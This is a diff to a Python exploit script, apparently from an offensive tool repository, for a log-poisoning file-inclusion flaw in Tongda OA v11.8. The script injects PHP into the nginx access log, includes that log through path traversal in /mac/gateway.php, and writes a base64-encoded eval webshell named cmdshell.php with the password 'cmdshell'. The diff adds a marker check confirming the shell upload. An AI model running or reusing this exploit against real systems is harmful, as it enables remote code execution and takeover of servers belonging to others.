@@ -22,7 +22,7 @@ def main(target_url):
         "Accept-Encoding":"gzip",
         "Content-Type":"application/x-www-form-urlencoded"
         }
-    payload='''d1a4278d?json={}&aa=<?php @fputs(fopen(base64_decode('Y21kc2hlbGwucGhw'),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWRzaGVsbCddKTs/Pg=='));?>'''
+    payload='''d1a4278d?json={}&aa=hello<?php @fputs(fopen(base64_decode('Y21kc2hlbGwucGhw'),w),base64_decode('aGVsbG88P3BocCBAZXZhbCgkX1BPU1RbJ2NtZHNoZWxsJ10pOz8+'));?>'''
     data='json={"url":"/general/../../nginx/logs/oa.access.log"}'
     
     incloud_url=target_url+payload
@@ -37,7 +37,7 @@ def main(target_url):
         response1=requests.post(exp_url, headers=headerx, data=data,verify=False)
         response2=requests.post(vlun_url, headers=headerx, data=data,verify=False)
         shell = requests.get(shell_url, headers=headers, verify=False)
-        if   response2.status_code == 200:
+        if response2.status_code == 200:
             console.print(now_time() + ' [SUCCESS]  包含漏洞存在，包含数据包为:{}'.format(vlun_url), style='bold green')
             console.print(now_time() + ''' [SUCCESS]  POST /mac/gateway.php HTTP/1.1
                        Host: 
@@ -47,13 +47,13 @@ def main(target_url):
                        Accept-Encoding: gzip
 
                        json={"url":"/general/../../nginx/logs/oa.access.log"}''', style='bold green')
-            if  shell.status_code==200:
+            if  shell.status_code==200 and "hello" in shell.text:
                 console.print(now_time() + ' [SUCCESS]  上传webshell成功，密码为cmdshell，shell地址:{}'.format(shell_url), style='bold green')
                 
             else:
                 console.print(now_time() + ' [WARNING]  通达OA 包含日志成功，可查取日志文件，但无法在目录下生成webshell', style='bold red ')
         else:
-                console.print(now_time() + ' [WARNING]  通达OA v11.8远程包含不存在', style='bold red ')    
+            console.print(now_time() + ' [WARNING]  通达OA v11.8远程包含不存在', style='bold red ')    
 
     except:
         console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
